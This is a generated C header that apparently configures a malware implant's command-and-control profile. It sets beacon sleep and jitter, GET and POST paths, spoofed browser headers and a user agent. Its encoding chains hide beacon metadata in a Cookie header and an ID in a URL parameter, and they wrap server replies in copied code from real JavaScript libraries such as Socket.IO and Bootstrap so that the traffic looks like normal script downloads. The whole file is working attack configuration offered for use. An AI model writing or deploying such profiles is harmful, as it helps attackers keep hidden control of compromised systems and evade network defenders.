#ifndef PROFILE_GENERATED_H
#define PROFILE_GENERATED_H

#include "transform.h"
#include "profile.h"

#define PROFILE_NAME "RMUJSAZQ"
#define PROFILE_VERSION 1
#define PROFILE_GENERATED_BY "InsertProfile.py v1.0"

#define PROFILE_SLEEP_TIME 2
#define PROFILE_JITTER 36

static const char *gen_get_uris[] = {
    "/update/v9.48/A6OJOOM9J",
};

static const char *gen_post_uris[] = {
    "/def/v7.88/DM33EBRW",
};

static const profile_header_t gen_get_headers[] = {
    { "Accept", "application/json, text/html, image/*" },
    { "Accept-Language", "ar-ae" },
    { "Accept-Encoding", "compress, br" },
};

static const profile_header_t gen_post_headers[] = {
    { "Accept", "application/xml, text/html, image/*" },
    { "Accept-Language", "ar-kw" },
    { "Accept-Encoding", "compress, gzip" },
};

static const transform_step_t gen_metadata_steps[] = {
    { TRANSFORM_MASK, NULL },
    { TRANSFORM_NETBIOS, NULL },
    { TRANSFORM_PREPEND, "MLBG_AOBHF94CILA87UGE2IEEG3D5J6EB3MC3=" },
};
static const transform_chain_t gen_metadata_chain = {
    .steps = gen_metadata_steps,
    .step_count = 3,
    .terminator = TERMINATOR_HEADER,
    .terminator_arg = "Cookie",
};

static const transform_step_t gen_id_steps[] = {
    { TRANSFORM_MASK, NULL },
    { TRANSFORM_BASE64URL, NULL },
};
static const transform_chain_t gen_id_chain = {
    .steps = gen_id_steps,
    .step_count = 2,
    .terminator = TERMINATOR_PARAMETER,
    .terminator_arg = "_CNSFWASU",
};

static const transform_step_t gen_output_steps[] = {
    { TRANSFORM_MASK, NULL },
    { TRANSFORM_NETBIOS, NULL },
};
static const transform_chain_t gen_output_chain = {
    .steps = gen_output_steps,
    .step_count = 2,
    .terminator = TERMINATOR_PRINT,
    .terminator_arg = NULL,
};

static const transform_step_t gen_server_get_steps[] = {
    { TRANSFORM_MASK, NULL },
    { TRANSFORM_BASE64URL, NULL },
    { TRANSFORM_PREPEND, "\n!function(e,t){\"object\"==typeof exports&&\"object\"==typeof module?module.exports=t(require(\"vue\")):\"function\"==typeof define&&define.amd?define(\"ELEMENT\",[\"vue\"],t):\"object\"==typeof exports?exports.ELEMENT=t(require(\"vue\")):e.ELEMENT=t(e.Vue)}(\"undefined\"!=typeof self?self:this,function(n){return i=[function(e,t){e.exports=n},function(e,t,n){var i=n(4);e.exports=function(e,t,n){return void 0===n?i(e,t,!1):i(e,n,!1!==t)}},function(f,m,g){var v;!function(){\"use strict\";function e(){}var u={},c=/d{1,4}|M{1,4}|yy(?:yy)?|S{1,3}|Do|ZZ|([HhMsDm])\x01?|[aA]|\"[^\"]*\"|'[^']*'/g,t=\"[^\\s]+\",h=/\\[([^]*?)\\]/gm;function n(e,t){for(var n=[],i=0,r=e.length;i<r;i++)n.push(e[i].substr(0,t));return n}function i(i){return function(e,t,n){n=n[i].indexOf(t.charAt(0).toUpperCase()+t.substr(1).toLowerCase());~n&&(e.month=n)}}function r(e,t){for(e=String(e),t=t||2;e.length<t;)e=\"0\"+e;return e}var o=[\"Sunday\",\"Monday\",\"Tuesday\",\"Wednesday\",\"Thursday\",\"Friday\",\"Saturday\"],s=[\"January\",\"February\",\"March\",\"April\",\"May\",\"June\",\"July\",\"August\",\"September\",\"October\",\"November\",\"December\"],a=n(s,3),l=n(o,3),d=(u.i18n={dayNamesShort:l,dayNames:o,monthNamesShort:a,monthNames:s,amPm:[\"am\",\"pm\"],DoFn:function(e){return e+[\"th\",\"st\",\"nd\",\"rd\"][3<e%10?0:(e-e%10!=10)*e%10]}},{D:function(e){return e.getDay()},DD:function(e){return r(e.getDay())},Do:function(e,t){return t.DoFn(e.getDate())},d:function(e){return e.getDate()},dd:function(e){return r(e.getDate())},ddd:function(e,t){return t.dayNamesShort[e.getDay()]},dddd:function(e,t){return t.dayNames[e.getDay()]},M:function(e){return e.getMonth()+1},MM:function(e){return r(e.getMonth()+1)},MMM:function(e,t){return t.monthNamesShort[e.getMonth()]},MMMM:function(e,t){return t.monthNames[e.getMonth()]},yy:function(e){return r(String(e.getFullYear()),4).substr(2)},yyyy:function(e){return r(e.getFullYear(),4)},h:function(e){return e.getHours()%12||12},hh:function(e){return r(e.getHours()%12||12)},H:function(e){return e.getHours()},HH:function(e){return r(e.getHours())},m:function(e){return e.getMinutes()},mm:function(e){return r(e.getMinutes())},s:function(e){return e.getSeconds()},ss:function(e){return r(e.getSeconds())},S:function(e){return Math.round(e.getMilliseconds()/100)},SS:function(e){return r(Math.round(e.getMilliseconds()/10),2)},SSS:function(e){return r(e.getMilliseconds(),3)},a:function(e,t){return e.getHours()<12?t.amPm[0]:t.amPm[1]},A:function(e,t){return(e.getHours()<12?t.amPm[0]:t.amPm[1]).toUpperCase()},ZZ:function(e){e=e.getTimezoneOffset();return(0<e?\"-\":\"+\")+r(100*Math.floor(Math.abs(e)/60)+Math.abs(e)%60,4)}}),p={d:[\"\\d\\d?\",function(e,t){e.day=t}],Do:[\"\\d\\d?\"+t,function(e,t){e.day=parseInt(t,10)}],M:[\"\\d\\d?\",function(e,t){e.month=t-1}],yy:[\"\\d\\d?\",function(e,t){var n=+(\"\"+(new Date).getFullYear()).substr(0,2);e.year=\"\"+(68<t?n-1:n)+t}],h:[\"\\d\\d?\",function(e,t){e.hour=t}],m:[\"\\d\\d?\",function(e,t){e.minute=t}],s:[\"\\d\\d?\",function(e,t){e.second=t}],yyyy:[\"\\d{4}\",function(e,t){e.year=t}],S:[\"\\d\",function(e,t){e.millisecond=100*t}],SS:[\"\\d{2}\",function(e,t){e.millisecond=10*t}],SSS:[\"\\d{3}\",function(e,t){e.millisecond=t}],D:[\"\\d\\d?\",e],ddd:[t,e],MMM:[t,i(\"monthNamesShort\")],MMMM:[t,i(\"monthNames\")],a:[t,function(e,t,n){t=t.toLowerCase();t===n.amPm[0]?e.isPm=!1:t===n.amPm[1]&&(e.isPm=!0)}],ZZ:[\"[^\\s]*?[\\+\\-]\\d\\d:?\\d\\d|[^\\s]*?Z\",function(e,t){var n,t=(t+\"\").match(/([+-]|\\d\\d)/gi);t&&(n=60*t[1]+parseInt(t[2],10),e.timezoneOffset=\"+\"===t[0]?n:-n)}]};p.dd=p.d,p.dddd=p.ddd,p.DD=p.D,p.mm=p.m,p.hh=p.H=p.HH=p.h,p.MM=p.M,p.ss=p.s,p.A=p.a,u.masks={default:\"ddd MMM dd yyyy HH:mm:ss\",shortDate:\"M/D/yy\",mediumDate:\"MMM d, yyyy\",longDate:\"MMMM d, yyyy\",fullDate:\"dddd, MMMM d, yyyy\",shortTime:\"HH:mm\",mediumTime:\"HH:mm:ss\",longTime:\"HH:mm:ss.SSS\"},u.format=function(t,e,n){var i=n||u.i18n;if(\"number\"==typeof t&&(t=new Date(t)),\"[object Date]\"!==Object.prototype.toString.call(t)||isNaN(t.getTime()))throw new Error(\"Invalid Date in fecha.format\");e=u.masks[e]||e||u.masks.default;var r=[];return(e=(e=e.replace(h,function(e,t){return r.push(t),\"@@@\"})).replace(c,function(e){return e in d?d[e](t,i):e.slice(1,e.length-1)})).replace(/@@@/g,function(){return r.shift()})},u.parse=function(e,t,n){var i=n||u.i18n;if(\"string\"!=typeof t)throw new Error(\"Invalid format in fecha.parse\");if(t=u.masks[t]||t,1e3<e.length)return null;var r={},o=[],s=[],n=(n=(t=t.replace(h,function(e,t){return s.push(t),\"@@@\"})).replace(/[|\\{()[^$+*?.-]/g,\"\\$&\").replace(c,function(e){var t;return p[e]?(t=p[e],o.push(t[1]),\"(\"+t[0]+\")\"):e})).replace(/@@@/g,function(){return s.shift()}),a=e.match(new RegExp(n,\"i\"));if(!a)return null;for(var l=1;l<a.length;l++)o[l-1](r,a[l],i);t=new Date;return!0===r.isPm&&null!=r.hour&&12!=+r.hour?r.hour=+r.hour+12:!1===r.isPm&&12==+r.hour&&(r.hour=0),null!=r.timezoneOffset?(r.minute=+(r.minute||0)-+r.timezoneOffset,new Date(Date.UTC(r.year||t.getFullYear(),r.month||0,r.day||1,r.hour||0,r.minute||0,r.second||0,r.millisecond||0))),n=\n" },
    { TRANSFORM_APPEND, "\n/*!\n * Socket.IO v4.5.4\n * (c) 2014-2022 Guillermo Rauch\n * Released under the MIT License.\n */\n(function (global, factory) {\n  typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :\n  typeof define === 'function' && define.amd ? define(factory) :\n  (global = typeof globalThis !== 'undefined' ? globalThis : global || self, global.io = factory());\n})(this, (function () { 'use strict';\n\n  function _typeof(obj) {\n    \"@babel/helpers - typeof\";\n\n    return _typeof = \"function\" == typeof Symbol && \"symbol\" == typeof Symbol.iterator ? function (obj) {\n      return typeof obj;\n    } : function (obj) {\n      return obj && \"function\" == typeof Symbol && obj.constructor === Symbol && obj !== Symbol.prototype ? \"symbol\" : typeof obj;\n    }, _typeof(obj);\n  }\n\n  function _classCallCheck(instance, Constructor) {\n    if (!(instance instanceof Constructor)) {\n      throw new TypeError(\"Cannot call a class as a function\");\n    }\n  }\n\n  function _defineProperties(target, props) {\n    for (var i = 0; i < props.length; i++) {\n      var descriptor = props[i];\n      descriptor.enumerable = descriptor.enumerable || false;\n      descriptor.configurable = true;\n      if (\"value\" in descriptor) descriptor.writable = true;\n      Object.defineProperty(target, descriptor.key, descriptor);\n    }\n  }\n\n  function _createClass(Constructor, protoProps, staticProps) {\n    if (protoProps) _defineProperties(Constructor.prototype, protoProps);\n    if (staticProps) _defineProperties(Constructor, staticProps);\n    Object.defineProperty(Constructor, \"prototype\", {\n      writable: false\n    });\n    return Constructor;\n  }\n\n  function _extends() {\n    _extends = Object.assign ? Object.assign.bind() : function (target) {\n      for (var i = 1; i < arguments.length; i++) {\n        var source = arguments[i];\n\n        for (var key in source) {\n          if (Object.prototype.hasOwnProperty.call(source, key)) {\n            target[key] = source[key];\n          }\n        }\n      }\n\n      return target;\n    };\n    return _extends.apply(this, arguments);\n  }\n" },
};
static const transform_chain_t gen_server_get_chain = {
    .steps = gen_server_get_steps,
    .step_count = 4,
    .terminator = TERMINATOR_PRINT,
    .terminator_arg = NULL,
};

static const transform_step_t gen_server_post_steps[] = {
    { TRANSFORM_MASK, NULL },
    { TRANSFORM_NETBIOSU, NULL },
    { TRANSFORM_PREPEND, "\n/*!\n  * Bootstrap v5.2.3 (https://getbootstrap.com/)\n  * Copyright 2011-2022 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)\n  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)\n  */\n!function(t,e){\"object\"==typeof exports&&\"undefined\"!=typeof module?module.exports=e(require(\"@popperjs/core\")):\"function\"==typeof define&&define.amd?define([\"@popperjs/core\"],e):(t=\"undefined\"!=typeof globalThis?globalThis:t||self).bootstrap=e(t.Popper)}(this,(function(t){\"use strict\";function e(t){if(t&&t.__esModule)return t;const e=Object.create(null,{[Symbol.toStringTag]:{value:\"Module\"}});if(t)for(const i in t)if(\"default\"!==i){const s=Object.getOwnPropertyDescriptor(t,i);Object.defineProperty(e,i,s.get?s:{enumerable:!0,get:()=>t[i]})}return e.default=t,Object.freeze(e)}const i=e(t),s=\"transitionend\",n=t=>{let e=t.getAttribute(\"data-bs-target\");if(!e||\"\n" },
    { TRANSFORM_APPEND, "\n\"use strict\";var _interopRequireWildcard=require(\"@babel/runtime/helpers/interopRequireWildcard\"),_interopRequireDefault=require(\"@babel/runtime/helpers/interopRequireDefault\");Object.defineProperty(exports,\"__esModule\",{value:!0}),exports.default=exports.styles=void 0;var _extends2=_interopRequireDefault(require(\"@babel/runtime/helpers/extends\")),_objectWithoutProperties2=_interopRequireDefault(require(\"@babel/runtime/helpers/objectWithoutProperties\")),React=_interopRequireWildcard(require(\"react\")),_propTypes=_interopRequireDefault(require(\"prop-types\")),_clsx=_interopRequireDefault(require(\"clsx\")),_withStyles=_interopRequireDefault(require(\"../styles/withStyles\")),_capitalize=_interopRequireDefault(require(\"../utils/capitalize\")),_Paper=_interopRequireDefault(require(\"../Paper\")),styles=function(e){var t=\"light\"===e.palette.type?e.palette.grey[100]:e.palette.grey[900];return{root:{display:\"flex\",flexDirection:\"column\",width:\"100%\",boxSizing:\"border-box\",zIndex:e.zIndex.appBar,flexShrink:0},positionFixed:{position:\"fixed\",top:0,left:\"auto\",right:0,\"@media print\":{position:\"absolute\"}},positionAbsolute:{position:\"absolute\",top:0,left:\"auto\",right:0},positionSticky:{position:\"sticky\",top:0,left:\"auto\",right:0},positionStatic:{position:\"static\"},positionRelative:{position:\"relative\"},colorDefault:{backgroundColor:t,color:e.palette.getContrastText(t)},colorPrimary:{backgroundColor:e.palette.primary.main,color:e.palette.primary.contrastText},colorSecondary:{backgroundColor:e.palette.secondary.main,color:e.palette.secondary.contrastText},colorInherit:{color:\"inherit\"},colorTransparent:{backgroundColor:\"transparent\",color:\"inherit\"}}};exports.styles=styles;var AppBar=React.forwardRef(function(e,t){var r=e.classes,o=e.className,i=e.color,a=void 0===i?\"primary\":i,i=e.position,i=void 0===i?\"fixed\":i,e=(0,_objectWithoutProperties2.default)(e,[\"classes\",\"className\",\"color\",\"position\"]);return React.createElement(_Paper.default,(0,_extends2.default)({square:!0,component:\"header\",elevation:4,className:(0,_clsx.default)(r.root,r[\"position\".concat((0,_capitalize.default)(i))],r[\"color\".concat((0,_capitalize.default)(a))],o,\"fixed\"===i&&\"mui-fixed\"),ref:t},e))});\"production\"!==process.env.NODE_ENV&&(AppBar.propTypes={children:_propTypes.default.node,classes:_propTypes.default.object,className:_propTypes.default.string,color:_propTypes.default.oneOf([\"default\",\"inherit\",\"primary\",\"secondary\",\"transparent\"]),position:_propTypes.default.oneOf([\"absolute\",\"fixed\",\"relative\",\"static\",\"sticky\"])});var _default=(0,_withStyles.default)(styles,{name:\"MuiAppBar\"})(AppBar);exports.default=_\n" },
};
static const transform_chain_t gen_server_post_chain = {
    .steps = gen_server_post_steps,
    .step_count = 4,
    .terminator = TERMINATOR_PRINT,
    .terminator_arg = NULL,
};

#define GENERATED_GET_URIS gen_get_uris
#define GENERATED_GET_URI_COUNT 1
#define GENERATED_GET_VERB "GET"
#define GENERATED_GET_HEADERS gen_get_headers
#define GENERATED_GET_HEADER_COUNT 3
#define GENERATED_METADATA_TRANSFORM gen_metadata_chain

#define GENERATED_POST_URIS gen_post_uris
#define GENERATED_POST_URI_COUNT 1
#define GENERATED_POST_VERB "POST"
#define GENERATED_POST_HEADERS gen_post_headers
#define GENERATED_POST_HEADER_COUNT 3
#define GENERATED_ID_TRANSFORM gen_id_chain
#define GENERATED_OUTPUT_TRANSFORM gen_output_chain

#define GENERATED_SERVER_GET_TRANSFORM gen_server_get_chain
#define GENERATED_SERVER_POST_TRANSFORM gen_server_post_chain

#define GENERATED_USER_AGENT "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"

#endif
